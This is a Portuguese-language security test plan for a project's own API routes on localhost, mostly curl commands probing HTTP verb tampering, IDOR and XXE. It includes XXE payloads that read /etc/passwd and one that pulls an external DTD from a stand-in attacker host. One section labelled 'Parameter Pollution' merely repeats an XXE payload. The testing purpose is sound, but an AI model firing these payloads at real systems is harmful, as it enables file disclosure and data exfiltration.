# Relatório 2 – Roteiro de Testes de Segurança em APIs

## Introdução

Este relatório apresenta um roteiro detalhado para a realização de testes de segurança nas principais rotas de API do projeto, com foco em três tipos de vulnerabilidades: HTTP Verb Tampering, IDOR (Insecure Direct Object Reference) e XXE (XML External Entity). As recomendações e observações de segurança também estão incluídas para garantir a condução responsável dos testes.

## Principais Rotas de API

O projeto possui as seguintes rotas de API principais:

- `/api/v1/rasa-conversations/`
- `/api/v1/opinion-component/`
- `/api/v1/conversations/`
- `/api/v1/comments/`
- `/api/v1/votes/`
- `/api/v1/clusterizations/`
- `/api/v1/profiles/`
- `/api/v1/boards/`
- `/api/v1/users/`
- `/api/v1/` (autenticação)

## 1. HTTP Verb Tampering

Teste o comportamento dos endpoints utilizando diferentes métodos HTTP:

```bash
# Teste de Autenticação
curl -X OPTIONS http://localhost:8000/api/v1/token/
curl -X PUT http://localhost:8000/api/v1/token/
curl -X DELETE http://localhost:8000/api/v1/token/
curl -X PATCH http://localhost:8000/api/v1/token/
curl -X HEAD http://localhost:8000/api/v1/token/

# Teste de Usuários
curl -X OPTIONS http://localhost:8000/api/v1/users/
curl -X PUT http://localhost:8000/api/v1/users/1/
curl -X DELETE http://localhost:8000/api/v1/users/1/
curl -X PATCH http://localhost:8000/api/v1/users/1/
curl -X HEAD http://localhost:8000/api/v1/users/1/

# Teste de Perfis
curl -X OPTIONS http://localhost:8000/api/v1/profiles/
curl -X PUT http://localhost:8000/api/v1/profiles/1/
curl -X DELETE http://localhost:8000/api/v1/profiles/1/
curl -X PATCH http://localhost:8000/api/v1/profiles/1/
curl -X HEAD http://localhost:8000/api/v1/profiles/1/

# Teste de Conversas
curl -X OPTIONS http://localhost:8000/api/v1/conversations/
curl -X PUT http://localhost:8000/api/v1/conversations/1/
curl -X DELETE http://localhost:8000/api/v1/conversations/1/
curl -X PATCH http://localhost:8000/api/v1/conversations/1/
curl -X HEAD http://localhost:8000/api/v1/conversations/1/
```

## 2. IDOR (Insecure Direct Object Reference)

Teste o acesso e modificação de recursos de outros usuários:

```bash
# Teste de Usuários
curl -X GET http://localhost:8000/api/v1/users/2/ -H "Authorization: Bearer seu_token"

# Teste de Perfis
curl -X PUT http://localhost:8000/api/v1/profiles/2/ \
  -H "Authorization: Bearer seu_token" \
  -H "Content-Type: application/json" \
  -d '{"phone_number": "123456789"}'

# Teste de Conversas
curl -X GET http://localhost:8000/api/v1/conversations/2/ -H "Authorization: Bearer seu_token"

# Teste de Comentários
curl -X PUT http://localhost:8000/api/v1/comments/2/ \
  -H "Authorization: Bearer seu_token" \
  -H "Content-Type: application/json" \
  -d '{"content": "comentário modificado"}'

# Teste de Votos
curl -X PUT http://localhost:8000/api/v1/votes/2/ \
  -H "Authorization: Bearer seu_token" \
  -H "Content-Type: application/json" \
  -d '{"choice": "agree"}'

# Teste de Clusterizações
curl -X GET http://localhost:8000/api/v1/clusterizations/2/ -H "Authorization: Bearer seu_token"

# Teste de Quadros
curl -X PUT http://localhost:8000/api/v1/boards/2/ \
  -H "Authorization: Bearer seu_token" \
  -H "Content-Type: application/json" \
  -d '{"title": "quadro modificado"}'
```

## 3. XXE (XML External Entity)

Teste endpoints que aceitam XML para identificar possíveis vulnerabilidades XXE:

```bash
# Criar arquivo XML malicioso
cat > payload.xml << 'EOF'
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
EOF

# Teste de Conversas
curl -X POST http://localhost:8000/api/v1/conversations/ \
  -H "Authorization: Bearer seu_token" \
  -H "Content-Type: application/xml" \
  -d @payload.xml

# Teste de Comentários
curl -X POST http://localhost:8000/api/v1/comments/ \
  -H "Authorization: Bearer seu_token" \
  -H "Content-Type: application/xml" \
  -d @payload.xml

# Criar arquivo XML com referência a entidade externa
cat > external.xml << 'EOF'
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://atacante.com/evil.dtd" >
%xxe;]>
<foo>&evil;</foo>
EOF

# Teste de Parameter Pollution
curl -X POST http://localhost:8000/api/v1/conversations/ \
  -H "Authorization: Bearer seu_token" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```
